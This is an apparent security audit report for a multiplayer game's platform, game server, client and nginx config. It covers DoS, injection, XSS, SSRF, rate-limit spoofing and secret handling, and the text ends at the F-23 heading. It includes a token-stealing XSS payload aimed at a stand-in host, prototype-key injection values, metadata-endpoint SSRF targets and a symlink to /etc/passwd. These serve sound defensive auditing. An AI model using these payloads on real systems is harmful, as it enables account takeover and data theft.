# GGD consolidated security audit (#154)

> **Scope.** Injection classes, DoS/DDoS, auth/session/secrets, and the
> browser-facing/content-serving surface (XSS/CSP/clickjacking/MIME/traversal/
> CORS/token-storage) across `apps/platform` (Go), `apps/game-server` (Colyseus),
> `apps/client` (Babylon+vite), `packages/shared` (sim), the vite content
> middleware, and `nginx/**` + `deploy/**`.
> **Method.** Every finding was read at file:line (not proximity-grepped). The
> load-bearing sinks were re-verified in this pass: `InputMailbox.push`,
> `content/registry.ts` `get()`/`tryGet()`, `WorldAnchorLayer` innerHTML,
> `nginx.conf` CSP header, `httpx.ClientIP`, `MatchRoom` tick-catch + `define`,
> `auth/service.go` argon2/conflict, `session.ts` localStorage.
> **Docs-only deliverable.** No source was edited. The game-server wave is
> landing its own fixes now (the `safeNow=true` items); everything else is
> DEFERRED with a mechanical reconcile recipe below.

## At a glance

- **26 findings**: 7 high · 9 medium · 6 low · 4 info/verified.
- **Being fixed now (game-server wave, `safeNow=true`): 5** — F-01, F-03, F-04, F-07, F-14.
- **Deferred (`safeNow=false`): 21** — platform 12, client 3, vite 2, infra 3 (incl. 1 nginx/CSP), plus the 4 info/verified regression-guards.
- **32 tests planned**: 8 added-now (game-server), 24 deferred. See the SECURITY TEST MATRIX at the end.

Attack-class order within each severity: **injection → DoS/DDoS → auth/session/secrets → web/XSS/CSP**.

---

## HIGH severity

### F-01 · injection · game-server · **FIX NOW**
**Unvalidated Colyseus INPUT payload: a prototype-name `slot`/`itemSlot` reaches `Registry.get()` and throws, ending the whole match room (one-message DoS).**

- **Vector:** prototype-key / payload-injection.
- **Location:** ingress `apps/game-server/src/seat/InputMailbox.ts:15-26` (`push` → `this.commands.push(...msg.commands)`, no shape check); sinks `packages/shared/src/sim/abilities/abilitySystem.ts:90,102,234-235`, `packages/shared/src/sim/economy/shop.ts:129-131`; throw site `packages/shared/src/sim/content/registry.ts:17` (`get()` throws; `tryGet()` at :20 does not). Room kill at `apps/game-server/src/rooms/MatchRoom.ts:206,217` (tick catch → `this.disconnect()`).
- **Current mitigation:** Prod `onAuth` requires a platform-minted seat ticket, so only a seated participant can send INPUT (no gate in dev). Task-#46's tick try/catch is **not** a mitigation here — it converts the throw into a full-room `disconnect()`, amplifying one bad command into a match-wide kill. No payload validation exists on this path.
- **Gap:** `InputMessage`/`Command` types are compile-time only. `ab.slots` is a plain object literal `{Q,W,E,R}` and `champ.items` is an Array, so a client `slot`/`itemSlot` naming a prototype member (`__proto__`,`constructor`,`toString`,`hasOwnProperty`,`valueOf`) returns a truthy prototype value that slips past the `!inst || inst.rank<=0` guard and reaches `Abilities.get(undefined)`/`Items.get(...)`, which throws. Reachable via `castAbility`, `rankUpAbility` (needs 1 unspent point), and `sellItem`. One crafted WebSocket message terminates the match for all 6-12 players, repeatable per room.
- **Recommended test:** Unit — feed `commandSystem` an IntentFrame with `{kind:'castAbility',slot:'constructor'}`, `{kind:'sellItem',itemSlot:'__proto__'}`, `{kind:'rankUpAbility',slot:'toString'}`; assert no throw and a `castRejected`/`sellRejected`/drop. Integration — push a raw `MSG.INPUT` with those to a live `MatchRoom`; assert the room is still ticking 1s later.
- **Recommended fix:** Whitelist every command at the game-server ingress (`MatchRoom.onMessage`/`InputMailbox.push`) before enqueueing: drop unknown `cmd.kind`; require `slot ∈ {Q,W,E,R,EX}`; require `itemSlot` an integer in `[0,INVENTORY_SLOTS)`; require finite numeric coords. Invalid → dropped, never thrown. Defense-in-depth (shared): `Object.hasOwn(ab.slots,slot)` / a `Map`, and `Abilities.tryGet`/`Items.tryGet` on any id derived from untrusted input.

### F-02 · DoS/DDoS · platform · DEFERRED
**Unauthenticated argon2id CPU+memory amplifier on `/auth/register` (and `/login`) — no app-layer per-IP throttle or concurrency cap.**

- **Vector:** cpu-exhaustion-amplification.
- **Location:** `apps/platform/internal/auth/service.go:137` (`Register` → `argon2id.CreateHash`), `handlers.go:43`, `server.go:228` (`throttleRegister`).
- **Current mitigation:** nginx `limit_req zone=authlogin rate=10r/m burst=5` on exact `/auth/login` + `/auth/register` (`nginx.conf:236-253`); global 1 MiB body cap. Both are edge-only / default-off at the app.
- **Gap:** Each register/login pays one argon2id hash (DefaultParams = 64 MiB, `Parallelism=NumCPU`), pinning every core. Register has NO service-layer per-IP limit; the only app backstop (`throttleRegister`) is default-off and, when on, is a single GLOBAL bucket — enabling it lets an attacker lock out ALL registrations (self-DoS). No semaphore bounds concurrent hashes → a burst of concurrent POSTs OOMs/CPU-saturates. The edge limit is bypassed by a botnet or any direct-to-platform path (cf. #117 LAN exposure class).
- **Recommended test:** Fire 50 concurrent `POST /auth/register` with unique usernames directly at the platform (bypass nginx); assert RSS stays bounded (global argon2 semaphore) and `/healthz` answers <200ms; assert a per-IP register limiter rejects past N/min independent of nginx.
- **Recommended fix:** Add a per-IP (peer-address) limiter to `Register` mirroring `Login`, and bound concurrent argon2 ops with a small weighted semaphore (~`NumCPU/2`). Keep the global register cap as defense-in-depth only, never the sole guard.

### F-03 · DoS/DDoS · game-server · **FIX NOW**
**Colyseus client-initiated room-creation flood: `onCreate` builds a 12-seat sim + ~60Hz loop before `onAuth` can reject.**

- **Vector:** room-creation-flood.
- **Location:** `apps/game-server/src/rooms/MatchRoom.ts:84` (`onCreate`), `:183` (`setSimulationInterval`); `apps/game-server/src/index.ts:132` (`gameServer.define("match", MatchRoom)` — no creation gate).
- **Current mitigation:** `onAuth` requires an HMAC ticket to JOIN (`MatchRoom.ts:72-82`); nginx `limit_conn wsconn 20` per IP on `/colyseus` + `/ws`; whitelist/combatEnv fetches behind a short-TTL cache.
- **Gap:** In Colyseus 0.16 the matchmaker runs `onCreate` FULLY (instantiate controller, allocate sim world, `setState`, start the sim interval) BEFORE `onAuth`. `onAuth` then rejects the join, but the freshly-created room lingers for `seatReservationTime` ticking a full bot sim, with no global max-rooms cap. Flooding `create()` spins up many concurrent ticking sims → CPU/memory exhaustion + zombie rooms. Legit matches are always created server-side via `matchMaker.createRoom` from the HMAC-authed `/_internal/matches` handler, so client creation has no legitimate use.
- **Recommended test:** Against the public WS endpoint with NO valid ticket, issue 500 rapid `create("match")` calls; assert rooms count stays ~0 and the event loop stays responsive (not 500 ticking rooms surviving `seatReservationTime`).
- **Recommended fix:** Gate `onCreate`: require a server-only proof in `options` (a value only `/_internal/matches` injects and a client cannot forge) and throw to abort before any sim state is built when absent. Also set a low `seatReservationTime`, keep `autoDispose`, add a process-wide max-concurrent-rooms guard.

### F-04 · DoS/DDoS · game-server · **FIX NOW**
**Unbounded INPUT command accumulation + no per-client message-rate cap (a single message can stall the sim event loop).**

- **Vector:** algorithmic-complexity.
- **Location:** `apps/game-server/src/seat/InputMailbox.ts:25` (`this.commands.push(...msg.commands)`); `apps/game-server/src/rooms/MatchRoom.ts:158` (`onMessage(INPUT)`).
- **Current mitigation:** seq-wrap dedupe drops stale/duplicate; `latestOrder`/`latestAim` keep only newest; #46 `planTicks` clamp bounds ticks-per-frame; `drain()` clears the array each running tick.
- **Gap:** `onMessage(MSG.INPUT)` applies no rate limit, and `push` appends with no cap on the array or on a single message's `commands[]`. `drain()` hands the ENTIRE accumulated array to one synchronous `ctl.tick()`. The #46 clamp bounds the NUMBER of ticks per frame but NOT the work per tick, so one INPUT with a huge `commands[]` (bounded only by WS payload) forces O(N) in a single tick → event-loop stall (the exact #46 freeze, on demand). Between drains the array also grows unbounded → memory. The uint16 seq gate only rejects stale/duplicate; an incrementing seq is accepted every time.
- **Recommended test:** From one joined client send an INPUT whose `commands` has 1,000,000 entries, and separately flood 5,000 INPUT messages within one 33 ms window; assert the mailbox caps accepted commands (rejects/truncates past a small per-tick bound) and a single tick stays under the tick budget (loop never blocks > `TICK_MS`).
- **Recommended fix:** Cap `commands[]` length per message and cap total buffered commands per tick in `push` (drop excess); add a per-session message-rate limit in `onMessage(INPUT)` (token bucket ~ a few×tickrate) and disconnect abusers. Optionally set an explicit `maxPayload` on `WebSocketTransport`.

### F-05 · DoS/DDoS (auth-adjacent) · platform · DEFERRED
**Login per-IP rate limit is keyed on the client-spoofable `X-Real-Ip` header.**

- **Vector:** rate-limit-bypass via header-spoofing.
- **Location:** `apps/platform/internal/httpx/middleware.go:35-44` (`ClientIP` returns `r.Header.Get("X-Real-Ip")` first, unconditionally); consumed at `apps/platform/internal/auth/service.go:198` (`RateAllow("login", ip, …)`). (Same root cause is re-filed as the auth-class finding **F-13**.)
- **Current mitigation:** nginx sets `proxy_set_header X-Real-IP $remote_addr` on the auth locations (`nginx.conf:241,250`), overriding any client value for edge-originated traffic; nginx also enforces its own 10r/m.
- **Gap:** `ClientIP` trusts the header from ANY source. If the platform is reachable off-nginx (LAN per #127, k8s pod-to-pod, a port-forward, a proxy misconfig — the #117 exposure class), an attacker rotates `X-Real-Ip` per request and the login limiter never trips → unbounded argon2id password-verify work and unlimited credential brute force.
- **Recommended test:** `POST /auth/login` directly to the platform 100× with a distinct `X-Real-Ip` each; assert the 10/min limiter still trips (key derived from the trusted transport peer) and returns 429.
- **Recommended fix:** Only trust `X-Real-Ip`/`X-Forwarded-For` when `RemoteAddr` is in a configured trusted-proxy CIDR; else key on `RemoteAddr`. Make the trusted-proxy set explicit config. (Note the existing `devsurface_test.go` guard forbids `auth`/`server`/`admin` from reading a caller address — the trusted-proxy resolution must live in `httpx` and be threaded, not added to those packages.)

### F-06 · web/XSS/CSP · client · DEFERRED
**Unescaped player `displayName` rendered into the live-game healthbar via `innerHTML` (DOM/stored XSS sink).**

- **Vector:** DOM-XSS.
- **Location:** `apps/client/src/ui/WorldAnchorLayer.tsx:40-58` (`makeChampionNode` → `el.innerHTML = ...color:${color}...>${name}</div>`); source `GameApp.ts:1499,1515`.
- **Current mitigation:** Input-side only — platform register enforces `^[a-z0-9][a-z0-9_-]{2,23}$` (`auth/service.go:24`) and the sanctioned flow sets `displayName = username`. There is NO output-side escaping and NO CSP `script-src`, so the whole defense is one upstream regex two services away (and F-07 shows how to bypass it).
- **Gap:** `name` is interpolated with no HTML escaping. A `displayName` of `<img src=x onerror=fetch('//evil/'+localStorage.ggd_tokens)>` executes in every other player's client when their healthbar is created. Because tokens live in localStorage (F-21) and prod CSP has no `script-src` (F-15), one injected string yields full account takeover of everyone in the match. `${color}` is a secondary CSS/attribute-injection vector.
- **Recommended test:** Vitest DOM — pass `name = "<img src=x onerror=window.__pwned=1>"` to `makeChampionNode`, mount it, assert `document.querySelector('img')` is null and the literal text is present as `textContent`.
- **Recommended fix:** Build the bar skeleton once, then set the name with `nameEl.textContent = name` (never string-concatenated HTML). Set numeric/`color` values via `element.style`, not the HTML string. Self-contained client change.

### F-07 · web/XSS/CSP · game-server · **FIX NOW**
**game-server accepts arbitrary seat `displayName` and match creation is not locked to the HMAC internal path (server-side XSS source that bypasses the platform username regex).**

- **Vector:** stored-XSS-source.
- **Location:** `apps/game-server/src/index.ts:61-69` (`handleInternalMatches` seat map), `:132` (`gameServer.define` with no create lock); `apps/game-server/src/rooms/MatchRoom.ts:98-102,148`.
- **Current mitigation:** `/_internal/matches` is HMAC-authenticated (`index.ts:46`) and nginx never exposes `/_internal` (only `/colyseus` WS), so the platform-driven flow supplies validated usernames. But client-initiated room creation over the Colyseus WS is not gated to that path.
- **Gap:** `handleInternalMatches` copies `seats[].displayName` verbatim with no charset/length/HTML validation, and `onCreate` trusts `options.seats` unconditionally. Any client holding a valid HMAC ticket can `joinOrCreate('match', {seats:[{seatId, accountId:<self>, displayName:'<img onerror=...>'}]})`, poisoning `seatByAccount` (`MatchRoom.ts:148`) with a name that any peer renders through the F-06 innerHTML sink — bypassing the platform regex entirely.
- **Recommended test:** game-server — `POST /_internal/matches` (valid HMAC) with `displayName` containing `<>"&` and length > 32; assert it is rejected or sanitized. Second — assert a client `joinOrCreate('match',{seats})` either cannot create a match or has its supplied seats ignored in favor of reserved seats.
- **Recommended fix:** In `handleInternalMatches` and `onCreate`, validate/normalize `displayName` to a bounded safe charset (mirror the platform username rule; strip `<>&"'`; cap length) before it enters seat state. Additionally restrict match creation to the internal reservation flow (reject client-supplied `options.seats` / require a create-only server token) so clients can't mint rooms with attacker-chosen seats.

---

## MEDIUM severity

### F-08 · injection · platform · DEFERRED
**SSRF: AI music/image flows follow provider-returned URLs (poll `location`, `output`/`audio_url`, image `url`) with no host allowlist; the poll fetch even carries the API key.**

- **Vector:** SSRF.
- **Location:** `apps/platform/internal/ai/provider.go:184-200` (`getRaw`), `:206-224` (`fetchAudioBytes`), `:284-302` (`fetchImageBytes`); `apps/platform/internal/ai/music.go:271-296`.
- **Current mitigation:** Base URLs are AdminOnly via `/admin/ai/config`; response bodies are size-capped (1-32 MiB). But the followed URLs are unrestricted, and `getRaw` sends the API key to the poll host.
- **Gap:** `generateMusicAsync` calls `getRaw(pollURL)` on a URL parsed from the provider's own JSON, attaching the provider auth header to whatever host that URL names — no allowlist, no block on loopback/RFC1918/`169.254.169.254`. `resolveMusicAudio`/`generateImagePNG` fetch `res.audioURL`/`image url` verbatim. A malicious/compromised provider (or an open redirect on it) pivots the server to internal services / cloud metadata and leaks the API key to an attacker-named host.
- **Recommended test:** Table test with an `httptest` provider whose create-response returns `urls.get`/`audio_url`/`image url` at `http://127.0.0.1:<port>/` and `http://169.254.169.254/latest/meta-data/`; assert the fetchers refuse (blocked-host error) and no `Authorization`/`x-api-key` is sent to a host other than the configured provider host.
- **Recommended fix:** Before following any provider-returned URL: require https; reject hosts resolving to loopback/link-local/RFC1918/ULA/`169.254.169.254` (DialControl or `net.ParseIP` on resolved addrs); constrain poll/asset URLs to the same registrable domain as `MusicBaseURL`/`ImageBaseURL`; never attach auth headers to a host differing from the configured provider host.

### F-09 · DoS/DDoS · platform · DEFERRED
**Go `http.Server` sets no `ReadTimeout`/`WriteTimeout`/`IdleTimeout` — slow-body slowloris and idle keep-alive exhaustion.**

- **Vector:** slowloris-connection-exhaustion.
- **Location:** `apps/platform/cmd/platform/main.go:44-48`.
- **Current mitigation:** `ReadHeaderTimeout: 10s` (slow-headers); nginx `keepalive_timeout 65s` + default request buffering for non-WS routes.
- **Gap:** `ReadTimeout`/`WriteTimeout`/`IdleTimeout` unset (0 = unlimited). `ReadHeaderTimeout` stops slow-headers but NOT a slow REQUEST BODY (a dribbling POST holds a goroutine) nor a slow response reader, and with no `IdleTimeout` keep-alives are held forever → goroutine/FD exhaustion. nginx buffers proxied bodies for `/api/*`, but the lobby WS and any direct/LAN access to `:8080` are unprotected.
- **Recommended test:** Open 200 connections that send a valid header block then trickle 1 byte/sec of body (and 200 that connect and idle); assert the server closes them via `ReadTimeout`/`IdleTimeout` and keeps serving `/healthz`.
- **Recommended fix:** Set conservative `ReadTimeout`, `WriteTimeout`, `IdleTimeout` (handle the long-lived lobby WS with per-message deadlines or a separate server/handler so a short `WriteTimeout` doesn't kill it). Add `MaxHeaderBytes`.

### F-10 · DoS/DDoS · platform · DEFERRED
**Lobby WebSocket has no per-account connection cap (goroutine/FD exhaustion); nginx `/api/` has no `limit_conn`.**

- **Vector:** websocket-resource-exhaustion.
- **Location:** `apps/platform/internal/lobby/hub.go:133` (`register`, unbounded per account); `ws.go:69`; `nginx.conf:256` (`/api/` location, no `limit_conn`).
- **Current mitigation:** JWT verified before upgrade (`ws.go:62`); slow-consumer sends dropped, not blocked; `coder/websocket` default 32 KiB read limit; nginx caps `/colyseus`+`/ws` at 20 conns/IP.
- **Gap:** `Hub.register` adds to `conns[accountID]` with no per-account cap; each connection spawns reader+writer goroutines + a 64-slot channel. The lobby WS at `/api/v1/lobby/ws` is under the `/api/` location which — unlike `/colyseus`/`/ws` — has NO `limit_conn` and a 3600s read timeout. One valid token opens unlimited long-lived lobby sockets → goroutine/FD/memory exhaustion. In open-signup mode a token is free.
- **Recommended test:** With one valid token open 1,000 concurrent `/api/v1/lobby/ws` connections; assert the platform caps per-account (rejects past N) and goroutine count stays bounded.
- **Recommended fix:** Enforce a per-account (and per-IP) lobby-WS cap in `Hub.register`/`handleWS`, evicting/rejecting past the limit; add `limit_conn` on the lobby WS path at the edge; add a read deadline / heartbeat so dead connections are reaped.

### F-11 · DoS/DDoS · platform · DEFERRED
**Unthrottled registration grows the JSON file-store and no-TTL Redis indexes without bound.**

- **Vector:** unbounded-store-growth.
- **Location:** `apps/platform/internal/auth/service.go:120-152` (`SetNX` username/email with ttl 0; `accounts.Create` writes JSON).
- **Current mitigation:** nginx per-IP 10r/m on `/auth/register` (edge-only); username/email uniqueness prevents duplicate keys; 1 MiB body cap.
- **Gap:** `Register` reserves username+email via `SetNX(..., 0)` (permanent Redis keys) and writes a durable account JSON before any approval. With no per-IP app throttle a flood writes unbounded account files and permanent Redis keys. Even under the #126 gate the account is persisted `pending` BEFORE approval, so gating withholds tokens but not disk/Redis growth. Sustained abuse fills disk and Redis memory.
- **Recommended test:** Send 100k register requests with unique usernames (bypass edge); assert account-file and Redis-key counts are bounded by a configured cap (registration refused past a ceiling) rather than growing without limit.
- **Recommended fix:** Add a per-IP register limiter (shared with F-02) and a cap on total pending/unapproved accounts; add a TTL/reaper for never-approved pending accounts and their reservation keys.

### F-12 · auth/session/secrets · platform · DEFERRED
**Access token accepted in the URL query string on ALL authenticated routes; disclosed via the nginx access log.**

- **Vector:** token-in-URL / token-in-logs.
- **Location:** `apps/platform/internal/auth/middleware.go:44-50` (`BearerToken` `?token=` fallback) + `nginx/nginx.conf:46` (`access_log /dev/stdout`, combined format logs `$request`).
- **Current mitigation:** App-layer `httpx.RequestLogger` logs only `r.URL.Path` (no query); tokens are short-lived (15 min). But the nginx access log captures the full URI, unmitigated.
- **Gap:** `BearerToken` falls back to `?token=<JWT>` for EVERY route, not just the WS handshake that needs it. Any authenticated request in that form writes a live token into the access log, and also leaks via browser history, `Referer`, and shared links.
- **Recommended test:** Table test that `?token=` is honored ONLY for the WS handshake handler and ignored on REST routes; an nginx log-format assertion that auth query params are stripped/masked before logging.
- **Recommended fix:** Scope the query-param token to the WS handshake handler alone; make `auth.Middleware` read the `Authorization` header exclusively. In nginx, define a `log_format`/`map` that omits/masks `token=`.

### F-13 · auth/session/secrets · platform · DEFERRED
**`ClientIP` trusts client-supplied `X-Real-Ip` unconditionally → login rate-limit / brute-force bypass off the edge.**

- **Vector:** header-spoofing / rate-limit-bypass. (Auth-class framing of the same root cause as **F-05**; fix once, closes both.)
- **Location:** `apps/platform/internal/httpx/middleware.go:35-44` (`ClientIP`), consumed by `auth/service.go:196-205`.
- **Current mitigation:** nginx `proxy_set_header X-Real-IP $remote_addr` overwrites any client value for edge-originated traffic; no mitigation for direct-to-platform traffic.
- **Gap:** `ClientIP` returns the header first with no check that the immediate peer is the trusted edge. Any caller reaching `:8080` off-nginx rotates `X-Real-Ip` for unlimited login attempts. The comment claims "first hop set by our own edge" but the code never verifies the peer.
- **Recommended test:** Unit — `ClientIP` ignores `X-Real-Ip`/`X-Forwarded-For` unless `RemoteAddr` is a trusted-proxy CIDR. Integration — 11 logins with rotating `X-Real-Ip` from a non-trusted peer still trip the 429.
- **Recommended fix:** Honor `X-Real-Ip`/`X-Forwarded-For` only when `RemoteAddr` is in a configured trusted-proxy allowlist, else fall back to `RemoteAddr`. Bind the platform listener to loopback/cluster-internal so nginx is the only ingress (aligns with #127).

### F-14 · auth/session/secrets · game-server · **FIX NOW**
**game-server fails OPEN when `PLATFORM_GAME_SHARED_SECRET` is unset — no boot guard; join auth + cheat gate silently disabled.**

- **Vector:** fail-open-misconfig / auth-bypass.
- **Location:** `apps/game-server/src/index.ts:23,164` + `apps/game-server/src/rooms/MatchRoom.ts:54,76,288-312` (`onAuth` `if (!SHARED_SECRET) return true`; `onJoin` accepts `options.accountId`) + `apps/game-server/src/match/cheatGate.ts:14-16`.
- **Current mitigation:** `/_internal/matches` returns 401 without a secret (`index.ts:46`), so platform-brokered creation can't proceed; but direct Colyseus room joins still fail open. `cheatsEnabled()` correctly disables cheats whenever the secret IS set. With the secret set, identity is server-verified and not spoofable — this is purely the misconfiguration fail-open.
- **Gap:** The platform got a fail-closed secret guard (#126). The game-server has none: an empty secret is silently DEV MODE — `onAuth` returns true for every join, `onJoin` accepts a client-supplied `options.accountId` as identity, and cheats turn on. A prod deploy that forgets the secret boots happily and serves unauthenticated, identity-spoofable, cheat-enabled matches.
- **Recommended test:** Boot test — process exits non-zero when `APP_ENV`/`NODE_ENV=production` and the secret is empty. `onAuth` unit — a join with no/invalid ticket is refused in that mode.
- **Recommended fix:** Add a startup guard mirroring the platform's `checkRequiredSecrets`: if the env is not explicitly development, require the secret or `process.exit(1)`. Remove the `options.accountId` identity fallback for any non-dev mode.

### F-15 · web/XSS/CSP · infra · DEFERRED
**Production Content-Security-Policy has no `script-src`/`default-src` — zero XSS mitigation.**

- **Vector:** CSP-weakness.
- **Location:** `nginx/nginx.conf:142` and `:180` (`add_header Content-Security-Policy "frame-ancestors 'none'"`).
- **Current mitigation:** `nosniff`, `Referrer-Policy`, HSTS, and `frame-ancestors 'none'` (clickjacking) are present at `nginx.conf:141-150`; `index.html` ships no CSP meta.
- **Gap:** The only directive is `frame-ancestors 'none'`. No `default-src`/`script-src`/`object-src`/`base-uri`, so the policy does nothing against XSS — an injected inline script or event handler (F-06 and the audition-page innerHTML sinks) executes unrestricted, with no allowlist limiting exfiltration. This is the missing second layer that turns the healthbar sink into account takeover.
- **Recommended test:** `curl -sI` the deployed edge for `/`; assert the CSP contains a restrictive `default-src` + `script-src` (no `unsafe-inline` scripts) + `object-src 'none'` + `base-uri 'self'`. Playwright — an injected inline `<script>` does not execute under the policy.
- **Recommended fix:** Extend to a real policy, e.g. `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; worker-src 'self' blob:`, tuned for Babylon (wasm/blob/data, worker) and any inline styles. Must be coordinated with the client bundle (vite nonce/inline-style handling) — a joint infra+client change, not a lone header edit.

### F-16 · web/XSS/CSP · client · DEFERRED
**Internal debug/audition HTML pages are bundled into the production client and publicly served.**

- **Vector:** attack-surface.
- **Location:** `apps/client/public/{model-budget,bgm-audition,firework-audition,ground-audition,intermission-audition}.html` → `apps/client/dist/*.html` served via `nginx.conf:156` (`try_files`).
- **Current mitigation:** `nosniff` applied by nginx; audition query params are `Number()`-coerced (`firework-audition.html:124`) so no reflected-XSS via URL today; rendered data is repo-controlled.
- **Gap:** The audition/tooling pages live in `public/` and emit to `dist/`, reachable in prod at `/model-budget.html` etc. They expose internal tooling detail and each renders `/content`-fetched data through ~20 `innerHTML = template-literal` sinks (e.g. `model-budget.html:322-715`), enlarging the XSS surface with no gameplay value. Under the F-15 no-`script-src` CSP any injection there executes freely.
- **Recommended test:** Post-build CI assertion — `ls apps/client/dist/*.html` contains only `index.html`; a request to `/model-budget.html` returns 404 in the prod profile.
- **Recommended fix:** Exclude audition/debug HTML from the prod build (move out of `public/` into a dev-only dir, or strip in the build step). Belt-and-suspenders: nginx `location ~ (model-budget|-audition)\.html$ { return 404; }` in the prod profile. Build exclusion is client-owned; the nginx deny is an infra edge change.

---

## LOW severity

### F-17 · injection · vite · DEFERRED
**Dev content middleware confines by lexical prefix but never resolves symlinks (`realpath`), so a symlink under a served root escapes the root.**

- **Vector:** path-traversal (symlink).
- **Location:** `apps/client/vite.config.ts:45-61` (`staticHandler`); same pattern `apps/admin/vite.config.ts:40-49`.
- **Current mitigation:** `resolve()` + `startsWith(rootDir+sep)` prefix check + `decodeURIComponent`; `copyrightTierGate` refuses restricted mounts to public peers. None dereference symlinks.
- **Gap:** `staticHandler` does `decodeURIComponent → resolve(rootDir,'.'+rel) → file.startsWith(rootDir+sep)`. That defeats `../`, encoded traversal, and null bytes, but `resolve()` does NOT dereference symlinks. A symlink under `content/` (or the git-ignored `data/blizzard-overlay` overlay this handler also serves) whose target is outside the root passes the lexical check while `createReadStream` streams external bytes — e.g. `content/leak -> /etc/passwd`. Bounded: needs an attacker-planted symlink in a served dir, and this middleware is dev/LAN-only.
- **Recommended test:** In a temp content root, create a symlink to a file outside the root, request it, assert 404/`next()` (not the external bytes). Add an encoded-traversal (`%2e%2e/`) case asserting refusal.
- **Recommended fix:** After `resolve()`, call `realpathSync` (or `fs.promises.realpath`) and re-check `startsWith(rootDir+sep)` before `statSync`/`createReadStream`; on any realpath error fall through to `next()`. Apply to both the content and blizzard-overlay roots.

### F-18 · auth/session/secrets · platform · DEFERRED
**User/email enumeration via distinct registration conflict responses (no app-layer per-IP register limit).**

- **Vector:** user-enumeration.
- **Location:** `apps/platform/internal/auth/service.go:120-135` ("username is already taken" vs "email is already registered").
- **Current mitigation:** Optional `GGD_REGISTER_RATE_LIMIT` global cap + edge per-IP throttle. Login itself is enumeration-safe (dummy-hash constant-shape response, `service.go:60`).
- **Gap:** Register returns two distinguishable 409s, letting an attacker enumerate registered usernames and emails. The username `SETNX` short-circuits before argon2, so a taken username replies measurably faster (a timing oracle). No per-IP app throttle → enumeration scales.
- **Recommended test:** Assert register returns one generic conflict code/message for both collisions; timing-parity test that taken-username and free-username calls are within a small delta.
- **Recommended fix:** Collapse both into one opaque error (e.g. "username or email is unavailable"); perform the argon2 hash before the uniqueness reply to equalize timing; add a per-IP register limiter alongside the global cap.

### F-19 · auth/session/secrets · platform · DEFERRED
**Access-token issuer/audience are stamped but never verified.**

- **Vector:** jwt-claim-validation.
- **Location:** `apps/platform/internal/auth/jwt.go:19-44` (`MintAccess` sets Issuer; `VerifyAccess` checks alg+exp+subject only).
- **Current mitigation:** HS256 pinned via `jwt.WithValidMethods` (alg=none and RS→HS confusion rejected), `jwt.WithExpirationRequired`, `Subject != ""` enforced. The JWT secret is currently single-purpose and distinct from the game HMAC secret.
- **Gap:** `MintAccess` stamps Issuer `ggd-platform` but `VerifyAccess` never asserts `iss`, and no `aud` is minted/checked. Not reachable today (single-purpose secret), but the moment that secret is reused for a second token type (download/WS/one-time), the absent `aud` check is what would let the two be swapped.
- **Recommended test:** A token signed with the same secret but a foreign `iss`/`aud` is rejected by `VerifyAccess`; retain the alg=none / non-HS256 rejection test.
- **Recommended fix:** Mint an Audience (e.g. `ggd-access`) and add `jwt.WithIssuer("ggd-platform")` + `jwt.WithAudience("ggd-access")` to the parser options.

### F-20 · auth/session/secrets · infra · DEFERRED
**Committed dev-insecure JWT/game/redis secrets in `values-local.yaml` (no guardrail against public use).**

- **Vector:** hardcoded-secret.
- **Location:** `deploy/helm/ggd/values-local.yaml:36-38` (`jwtSigningSecret: dev-insecure-jwt-secret`; `platformGameSharedSecret: dev-insecure-seam-secret`; `redisPassword: dev-insecure-redis-password`).
- **Current mitigation:** File name + comments mark it dev-only; `templates/secret.yaml` uses Helm `required` for prod secrets; `.gitignore` excludes `.env*` and `deploy/**/secrets*.yaml` (`values-local.yaml` is intentionally committed). The #126 boot guard checks non-empty, not non-weak.
- **Gap:** Three real secret values are committed. Nothing prevents an operator applying `values-local.yaml` to a public/LAN deploy — at which point the JWT signing secret is public and anyone can forge a valid admin access token (complete auth bypass).
- **Recommended test:** Deploy-lint that refuses to render/apply `values-local.yaml` unless the target context is loopback/dev; assert the three known strings never appear in a non-dev release manifest.
- **Recommended fix:** Generate ephemeral local secrets (the `make up` flow can) instead of committing them, or add a boot-time denylist rejecting the known dev-insecure values in any non-development environment.

### F-21 · web/XSS/CSP · client · DEFERRED
**JWT access + refresh tokens stored in `localStorage` — any XSS escalates to full account takeover.**

- **Vector:** insecure-token-storage.
- **Location:** `apps/client/src/ui/platform/session.ts:29-47` (localStorage `STORAGE_KEY = "ggd.session.v1"`); tokens delivered in the JSON body at `apps/platform/internal/auth/handlers.go:39-40,54,73`.
- **Current mitigation:** Same-origin only (no CORS wildcard); access tokens short-TTL with refresh rotation. But the refresh token in localStorage negates much of that once XSS lands.
- **Gap:** The token pair persists in localStorage (readable by any script on the origin — no httpOnly/SameSite/Secure) and is directly exfiltratable by F-06/F-16. A stolen refresh token grants long-lived access after the tab closes. This is the amplifier that makes the healthbar sink account-takeover.
- **Recommended test:** After login, assert the refresh token is NOT retrievable from page script (delivered as an httpOnly cookie) — OR, if bearer storage is retained, assert a strict `script-src` CSP is present as the compensating control.
- **Recommended fix:** Move the refresh token to an httpOnly + Secure + SameSite=Strict cookie set by the platform (keep the short-lived access token in memory only). If the bearer-in-JSON design is kept, treat the strict `script-src` CSP (F-15) as a hard prerequisite and document the accepted risk. Touches client + platform auth.

### F-22 · web/XSS/CSP · vite · DEFERRED
**Vite dev/LAN content handler sets no `X-Content-Type-Options` and serves unmapped extensions as `octet-stream`.**

- **Vector:** MIME-sniffing.
- **Location:** `apps/client/vite.config.ts:44-61` (`staticHandler`), CONTENT_MIME map `:31-42`, response headers `:53-54`.
- **Current mitigation:** `content/` is repo-controlled (no uploads); path-traversal guard intact; prod nginx sets `nosniff`; copyright tier-gate refuses restricted mounts to public peers.
- **Gap:** The dev/preview `/content` handler sets Content-Type from a small map and falls back to `application/octet-stream`, never setting `nosniff`. The `client-lan` script runs with `--host 0.0.0.0`, so a LAN peer fetching a `content/` file with an unmapped extension (a stray `.html`/`.svg`) could have the browser sniff and execute it. Dev/LAN-only (prod nginx sets `nosniff`).
- **Recommended test:** Vitest — request a content path, assert `X-Content-Type-Options: nosniff`; request an unmapped extension, assert it's denied or served with `nosniff`.
- **Recommended fix:** Add `res.setHeader('X-Content-Type-Options','nosniff')` in `staticHandler` and consider 404-ing extensions outside the known-safe CONTENT_MIME set. Owned by the in-flight content-serving/#127 wave.

---

## INFO / verified (documented for reconcile; no defect)

### F-23 · content-serving · verified safe
